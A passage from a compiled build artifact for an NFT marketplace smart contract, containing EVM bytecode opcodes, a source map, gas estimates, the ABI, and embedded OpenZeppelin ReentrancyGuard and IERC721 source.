PUSH2 0x147D DUP3 PUSH2 0x171F JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1495 PUSH1 0x0 DUP4 PUSH2 0x163D JUMP JUMPDEST SWAP2 POP PUSH2 0x14A0 DUP3 PUSH2 0x1748 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x14B8 PUSH1 0x1F DUP4 PUSH2 0x1648 JUMP JUMPDEST SWAP2 POP PUSH2 0x14C3 DUP3 PUSH2 0x174B JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 DUP3 ADD PUSH1 0x0 DUP3 ADD MLOAD PUSH2 0x14E4 PUSH1 0x0 DUP6 ADD DUP3 PUSH2 0x14FD JUMP JUMPDEST POP PUSH1 0x20 DUP3 ADD MLOAD PUSH2 0x14F7 PUSH1 0x20 DUP6 ADD DUP3 PUSH2 0x1447 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x1506 DUP2 PUSH2 0x16E1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1515 DUP2 PUSH2 0x16E1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1526 DUP3 PUSH2 0x1488 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x1545 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1456 JUMP JUMPDEST PUSH2 0x1552 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x1456 JUMP JUMPDEST PUSH2 0x155F PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x150C JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x157C PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x1456 JUMP JUMPDEST PUSH2 0x1589 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x150C JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x15A5 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x1456 JUMP JUMPDEST PUSH2 0x15B2 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x150C JUMP JUMPDEST PUSH2 0x15BF PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x150C JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x15E0 DUP2 PUSH2 0x1465 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1600 DUP2 PUSH2 0x14AB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x161C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x14CE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1637 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x150C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1664 DUP3 PUSH2 0x16E1 JUMP JUMPDEST SWAP2 POP PUSH2 0x166F DUP4 PUSH2 0x16E1 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x16A4 JUMPI PUSH2 0x16A3 PUSH2 0x16EB JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x16BA DUP3 PUSH2 0x16C1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x5472616E73666572206661696C65640000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH32 0x5265656E7472616E637947756172643A207265656E7472616E742063616C6C00 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH2 0x177D DUP2 PUSH2 0x16AF JUMP JUMPDEST DUP2 EQ PUSH2 0x1788 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x1794 DUP2 PUSH2 0x16E1 JUMP JUMPDEST DUP2 EQ PUSH2 0x179F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MULMOD PUSH8 0xBD9DF82C5FDBE829 PUSH11 0x22425EA397AF320AC46E53 SAR ADDMOD 0xB8 MUL DIV PUSH25 0x2B9A8CD364736F6C6343000807003300000000000000000000 ","sourceMap":"525:4089:11:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4501:111;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4322:173;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1976:588;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;3994:322;;;;;;;;;;;;;:::i;:::-;;2883:647;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;2570:307;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;3536:452;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;4501:111;4561:7;4587:10;:18;4598:6;4587:18;;;;;;;;;;;;;;;;4580:25;;4501:111;;;:::o;4322:173::-;4424:14;;:::i;:::-;4457:10;:22;4468:10;4457:22;;;;;;;;;;;;;;;:31;4480:7;4457:31;;;;;;;;;;;4450:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4322:173;;;;:::o;1976:588::-;2111:10;2123:7;1273:22;1298:10;:22;1309:10;1298:22;;;;;;;;;;;;;;;:31;1321:7;1298:31;;;;;;;;;;;1273:56;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1359:1;1343:7;:13;;;:17;1339:89;;;1397:10;1409:7;1383:34;;;;;;;;;;;;:::i;:::-;;;;;;;;1339:89;2148:10:::1;2160:7;2169:10;1800:11;1822:10;1800:33;;1843:13;1859:3;:11;;;1871:7;1859:20;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1843:36;;1904:5;1893:16;;:7;:16;;;1889:64;;1932:10;;;;;;;;;;;;;;1889:64;2208:1:::2;2199:5;:10;2195:70;;2232:22;;;;;;;;;;;;;;2195:70;2274:11;2296:10;2274:33;;2357:4;2321:41;;:3;:15;;;2337:7;2321:24;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;::::0;::::2;;;;;;;;;;;;::::0;::::2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:41;;;2317:106;;2385:27;;;;;;;;;;;;;;2317:106;2466:26;;;;;;;;2474:5;2466:26;;;;2481:10;2466:26;;;;::::0;2432:10:::2;:22;2443:10;2432:22;;;;;;;;;;;;;;;:31;2455:7;2432:31;;;;;;;;;;;:60;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2542:7;2530:10;2507:50;;2518:10;2507:50;;;2551:5;2507:50;;;;;;:::i;:::-;;;;;;;;2185:379;1790:180:::1;;1437:1;;;1263:182:::0;1976:588;;;;;:::o;3994:322::-;4041:16;4060:10;:22;4071:10;4060:22;;;;;;;;;;;;;;;;4041:41;;4108:1;4096:8;:13;4092:63;;4132:12;;;;;;;;;;;;;;4092:63;4189:1;4164:10;:22;4175:10;4164:22;;;;;;;;;;;;;;;:26;;;;4201:12;4227:10;4219:24;;4251:8;4219:45;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4200:64;;;4282:7;4274:35;;;;;;;;;;;;:::i;:::-;;;;;;;;;4031:285;;3994:322::o;2883:647::-;2985:10;2997:7;1515:22;1540:10;:22;1551:10;1540:22;;;;;;;;;;;;;;;:31;1563:7;1540:31;;;;;;;;;;;1515:56;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1602:1;1585:7;:13;;;:18;1581:86;;1636:10;1648:7;1626:30;;;;;;;;;;;;:::i;:::-;;;;;;;;1581:86;2261:21:0::1;:19;:21::i;:::-;3029:25:11::2;3057:10;:22;3068:10;3057:22;;;;;;;;;;;;;;;:31;3080:7;3057:31;;;;;;;;;;;3029:59;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::2;;;3114:10;:16;;;3102:9;:28;3098:116;;;3165:10;3177:7;3186:10;:16;;;3153:50;;;;;;;;;;;;;:::i;:::-;;;;;;;;3098:116;3256:9;3223:10;:29;3234:10;:17;;;3223:29;;;;;;;;;;;;;;;;:42;;;;;;;:::i;:::-;;;;;;;;3283:10;:22;3294:10;3283:22;;;;;;;;;;;;;;;:31;3306:7;3283:31;;;;;;;;;;;;3275:40:::0;::::2;;;;;;;;;;;;;;;;;;;;;;3333:10;3325:36;;;3375:10;:17;;;3406:10;3430:7;3325:122;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;::::0;::::2;;;;;;;;;;;;::::0;::::2;;;;;;;;;3497:7;3485:10;3462:61;;3473:10;3462:61;;;3506:10;:16;;;3462:61;;;;;;:::i;:::-;;;;;;;;3019:511;2303:20:0::1;:18;:20::i;:::-;1505:179:11::0;2883:647;;;;:::o;2570:307::-;2685:10;2697:7;2706:10;1800:11;1822:10;1800:33;;1843:13;1859:3;:11;;;1871:7;1859:20;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1843:36;;1904:5;1893:16;;:7;:16;;;1889:64;;1932:10;;;;;;;;;;;;;;1889:64;2735:10:::1;2747:7;1515:22;1540:10;:22;1551:10;1540:22;;;;;;;;;;;;;;;:31;1563:7;1540:31;;;;;;;;;;;1515:56;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;1602:1;1585:7;:13;;;:18;1581:86;;1636:10;1648:7;1626:30;;;;;;;;;;;;:::i;:::-;;;;;;;;1581:86;2778:10:::2;:22;2789:10;2778:22;;;;;;;;;;;;;;;:31;2801:7;2778:31;;;;;;;;;;;;2770:40:::0;::::2;;;;;;;;;;;;;;;;;;;;;;2862:7;2850:10;2825:45;;2838:10;2825:45;;;;;;;;;;;;1505:179:::1;1962:1;;1790:180:::0;;2570:307;;;;;:::o;3536:452::-;3678:10;3690:7;1515:22;1540:10;:22;1551:10;1540:22;;;;;;;;;;;;;;;:31;1563:7;1540:31;;;;;;;;;;;1515:56;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1602:1;1585:7;:13;;;:18;1581:86;;1636:10;1648:7;1626:30;;;;;;;;;;;;:::i;:::-;;;;;;;;1581:86;2261:21:0::1;:19;:21::i;:::-;3736:10:11::2;3748:7;3757:10;1800:11;1822:10;1800:33;;1843:13;1859:3;:11;;;1871:7;1859:20;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;::::0;::::2;;;;;;;;;;;;::::0;::::2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1843:36;;1904:5;1893:16;;:7;:16;;;1889:64;;1932:10;;;;;;;;;;;;;;1889:64;3799:1:::3;3787:8;:13;3783:73;;3823:22;;;;;;;;;;;;;;3783:73;3905:8;3865:10;:22;3876:10;3865:22;;;;;;;;;;;;;;;:31;3888:7;3865:31;;;;;;;;;;;:37;;:48;;;;3963:7;3951:10;3928:53;;3939:10;3928:53;;;3972:8;3928:53;;;;;;:::i;:::-;;;;;;;;1790:180:::2;;2292:1:0;;;2303:20:::1;:18;:20::i;:::-;1505:179:11::0;3536:452;;;;;:::o;2336:287:0:-;1759:1;2468:7;;:19;;2460:63;;;;;;;;;;;;:::i;:::-;;;;;;;;;1759:1;2598:7;:18;;;;2336:287::o;2629:209::-;1716:1;2809:7;:22;;;;2629:209::o;-1:-1:-1:-;;;;;;;;;;;;;;;;;;;;;:::o;7:139:15:-;53:5;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;7:139;;;;:::o;152:143::-;209:5;240:6;234:13;225:22;;256:33;283:5;256:33;:::i;:::-;152:143;;;;:::o;301:139::-;347:5;385:6;372:20;363:29;;401:33;428:5;401:33;:::i;:::-;301:139;;;;:::o;446:329::-;505:6;554:2;542:9;533:7;529:23;525:32;522:119;;;560:79;;:::i;:::-;522:119;680:1;705:53;750:7;741:6;730:9;726:22;705:53;:::i;:::-;695:63;;651:117;446:329;;;;:::o;781:351::-;851:6;900:2;888:9;879:7;875:23;871:32;868:119;;;906:79;;:::i;:::-;868:119;1026:1;1051:64;1107:7;1098:6;1087:9;1083:22;1051:64;:::i;:::-;1041:74;;997:128;781:351;;;;:::o;1138:474::-;1206:6;1214;1263:2;1251:9;1242:7;1238:23;1234:32;1231:119;;;1269:79;;:::i;:::-;1231:119;1389:1;1414:53;1459:7;1450:6;1439:9;1435:22;1414:53;:::i;:::-;1404:63;;1360:117;1516:2;1542:53;1587:7;1578:6;1567:9;1563:22;1542:53;:::i;:::-;1532:63;;1487:118;1138:474;;;;;:::o;1618:619::-;1695:6;1703;1711;1760:2;1748:9;1739:7;1735:23;1731:32;1728:119;;;1766:79;;:::i;:::-;1728:119;1886:1;1911:53;1956:7;1947:6;1936:9;1932:22;1911:53;:::i;:::-;1901:63;;1857:117;2013:2;2039:53;2084:7;2075:6;2064:9;2060:22;2039:53;:::i;:::-;2029:63;;1984:118;2141:2;2167:53;2212:7;2203:6;2192:9;2188:22;2167:53;:::i;:::-;2157:63;;2112:118;1618:619;;;;;:::o;2243:108::-;2320:24;2338:5;2320:24;:::i;:::-;2315:3;2308:37;2243:108;;:::o;2357:118::-;2444:24;2462:5;2444:24;:::i;:::-;2439:3;2432:37;2357:118;;:::o;2481:366::-;2623:3;2644:67;2708:2;2703:3;2644:67;:::i;:::-;2637:74;;2720:93;2809:3;2720:93;:::i;:::-;2838:2;2833:3;2829:12;2822:19;;2481:366;;;:::o;2853:398::-;3012:3;3033:83;3114:1;3109:3;3033:83;:::i;:::-;3026:90;;3125:93;3214:3;3125:93;:::i;:::-;3243:1;3238:3;3234:11;3227:18;;2853:398;;;:::o;3257:366::-;3399:3;3420:67;3484:2;3479:3;3420:67;:::i;:::-;3413:74;;3496:93;3585:3;3496:93;:::i;:::-;3614:2;3609:3;3605:12;3598:19;;3257:366;;;:::o;3699:510::-;3846:4;3841:3;3837:14;3934:4;3927:5;3923:16;3917:23;3953:63;4010:4;4005:3;4001:14;3987:12;3953:63;:::i;:::-;3861:165;4110:4;4103:5;4099:16;4093:23;4129:63;4186:4;4181:3;4177:14;4163:12;4129:63;:::i;:::-;4036:166;3815:394;3699:510;;:::o;4215:108::-;4292:24;4310:5;4292:24;:::i;:::-;4287:3;4280:37;4215:108;;:::o;4329:118::-;4416:24;4434:5;4416:24;:::i;:::-;4411:3;4404:37;4329:118;;:::o;4453:379::-;4637:3;4659:147;4802:3;4659:147;:::i;:::-;4652:154;;4823:3;4816:10;;4453:379;;;:::o;4838:442::-;4987:4;5025:2;5014:9;5010:18;5002:26;;5038:71;5106:1;5095:9;5091:17;5082:6;5038:71;:::i;:::-;5119:72;5187:2;5176:9;5172:18;5163:6;5119:72;:::i;:::-;5201;5269:2;5258:9;5254:18;5245:6;5201:72;:::i;:::-;4838:442;;;;;;:::o;5286:332::-;5407:4;5445:2;5434:9;5430:18;5422:26;;5458:71;5526:1;5515:9;5511:17;5502:6;5458:71;:::i;:::-;5539:72;5607:2;5596:9;5592:18;5583:6;5539:72;:::i;:::-;5286:332;;;;;:::o;5624:442::-;5773:4;5811:2;5800:9;5796:18;5788:26;;5824:71;5892:1;5881:9;5877:17;5868:6;5824:71;:::i;:::-;5905:72;5973:2;5962:9;5958:18;5949:6;5905:72;:::i;:::-;5987;6055:2;6044:9;6040:18;6031:6;5987:72;:::i;:::-;5624:442;;;;;;:::o;6072:419::-;6238:4;6276:2;6265:9;6261:18;6253:26;;6325:9;6319:4;6315:20;6311:1;6300:9;6296:17;6289:47;6353:131;6479:4;6353:131;:::i;:::-;6345:139;;6072:419;;;:::o;6497:::-;6663:4;6701:2;6690:9;6686:18;6678:26;;6750:9;6744:4;6740:20;6736:1;6725:9;6721:17;6714:47;6778:131;6904:4;6778:131;:::i;:::-;6770:139;;6497:419;;;:::o;6922:322::-;7065:4;7103:2;7092:9;7088:18;7080:26;;7116:121;7234:1;7223:9;7219:17;7210:6;7116:121;:::i;:::-;6922:322;;;;:::o;7250:222::-;7343:4;7381:2;7370:9;7366:18;7358:26;;7394:71;7462:1;7451:9;7447:17;7438:6;7394:71;:::i;:::-;7250:222;;;;:::o;7559:147::-;7660:11;7697:3;7682:18;;7559:147;;;;:::o;7712:169::-;7796:11;7830:6;7825:3;7818:19;7870:4;7865:3;7861:14;7846:29;;7712:169;;;;:::o;7887:305::-;7927:3;7946:20;7964:1;7946:20;:::i;:::-;7941:25;;7980:20;7998:1;7980:20;:::i;:::-;7975:25;;8134:1;8066:66;8062:74;8059:1;8056:81;8053:107;;;8140:18;;:::i;:::-;8053:107;8184:1;8181;8177:9;8170:16;;7887:305;;;;:::o;8198:96::-;8235:7;8264:24;8282:5;8264:24;:::i;:::-;8253:35;;8198:96;;;:::o;8300:126::-;8337:7;8377:42;8370:5;8366:54;8355:65;;8300:126;;;:::o;8432:77::-;8469:7;8498:5;8487:16;;8432:77;;;:::o;8515:180::-;8563:77;8560:1;8553:88;8660:4;8657:1;8650:15;8684:4;8681:1;8674:15;8824:117;8933:1;8930;8923:12;8947:165;9087:17;9083:1;9075:6;9071:14;9064:41;8947:165;:::o;9118:114::-;;:::o;9238:181::-;9378:33;9374:1;9366:6;9362:14;9355:57;9238:181;:::o;9425:122::-;9498:24;9516:5;9498:24;:::i;:::-;9491:5;9488:35;9478:63;;9537:1;9534;9527:12;9478:63;9425:122;:::o;9553:::-;9626:24;9644:5;9626:24;:::i;:::-;9619:5;9616:35;9606:63;;9665:1;9662;9655:12;9606:63;9553:122;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"1220800","executionCost":"23382","totalCost":"1244182"},"external":{"buyItem(address,uint256)":"infinite","cancelListing(address,uint256)":"infinite","getListing(address,uint256)":"infinite","getProceeds(address)":"2842","listItem(address,uint256,uint256)":"infinite","updateListing(address,uint256,uint256)":"infinite","withdrawProceeds()":"infinite"}},"methodIdentifiers":{"buyItem(address,uint256)":"9f37092a","cancelListing(address,uint256)":"b2ddee06","getListing(address,uint256)":"88700d1c","getProceeds(address)":"30cfeda9","listItem(address,uint256,uint256)":"89bfd38f","updateListing(address,uint256,uint256)":"f772adf1","withdrawProceeds()":"9038e693"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"AlreadyListed\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"NoProceeds\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"NotApprovedForMarketplace\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"NotListed\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"NotOwner\",\"type\":\"error\"},{\"inputs\":[],\"name\":\"PriceMustBeAboveZero\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"PriceNotMet\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"ItemBought\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"ItemCanceled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"ItemListed\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"buyItem\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"cancelListing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"}],\"name\":\"getListing\",\"outputs\":[{\"components\":[{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"}],\"internalType\":\"struct NftMarketplace.Listing\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"seller\",\"type\":\"address\"}],\"name\":\"getProceeds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"listItem\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"nftAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenId\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newPrice\",\"type\":\"uint256\"}],\"name\":\"updateListing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawProceeds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/NftMarketplace.sol\":\"NftMarketplace\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/security/ReentrancyGuard.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Contract module that helps prevent reentrant calls to a function.\\n *\\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\\n * available, which can be applied to functions to make sure there are no nested\\n * (reentrant) calls to them.\\n *\\n * Note that because there is a single `nonReentrant` guard, functions marked as\\n * `nonReentrant` may not call one another. This can be worked around by making\\n * those functions `private`, and then adding `external` `nonReentrant` entry\\n * points to them.\\n *\\n * TIP: If you would like to learn more about reentrancy and alternative ways\\n * to protect against it, check out our blog post\\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\\n */\\nabstract contract ReentrancyGuard {\\n    // Booleans are more expensive than uint256 or any type that takes up a full\\n    // word because each write operation emits an extra SLOAD to first read the\\n    // slot's contents, replace the bits taken up by the boolean, and then write\\n    // back. This is the compiler's defense against contract upgrades and\\n    // pointer aliasing, and it cannot be disabled.\\n\\n    // The values being non-zero value makes deployment a bit more expensive,\\n    // but in exchange the refund on every call to nonReentrant will be lower in\\n    // amount. Since refunds are capped to a percentage of the total\\n    // transaction's gas, it is best to keep them low in cases like this one, to\\n    // increase the likelihood of the full refund coming into effect.\\n    uint256 private constant _NOT_ENTERED = 1;\\n    uint256 private constant _ENTERED = 2;\\n\\n    uint256 private _status;\\n\\n    constructor() {\\n        _status = _NOT_ENTERED;\\n    }\\n\\n    /**\\n     * @dev Prevents a contract from calling itself, directly or indirectly.\\n     * Calling a `nonReentrant` function from another `nonReentrant`\\n     * function is not supported. It is possible to prevent this from happening\\n     * by making the `nonReentrant` function external, and making it call a\\n     * `private` function that does the actual work.\\n     */\\n    modifier nonReentrant() {\\n        _nonReentrantBefore();\\n        _;\\n        _nonReentrantAfter();\\n    }\\n\\n    function _nonReentrantBefore() private {\\n        // On the first call to nonReentrant, _status will be _NOT_ENTERED\\n        require(_status != _ENTERED, \\\"ReentrancyGuard: reentrant call\\\");\\n\\n        // Any calls to nonReentrant after this point will fail\\n        _status = _ENTERED;\\n    }\\n\\n    function _nonReentrantAfter() private {\\n        // By storing the original value once again, a refund is triggered (see\\n        // https://eips.ethereum.org/EIPS/eip-2200)\\n        _status = _NOT_ENTERED;\\n    }\\n}\\n\",\"keccak256\":\"0x190dd6f8d592b7e4e930feb7f4313aeb8e1c4ad3154c27ce1cf6a512fc30d8cc\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * 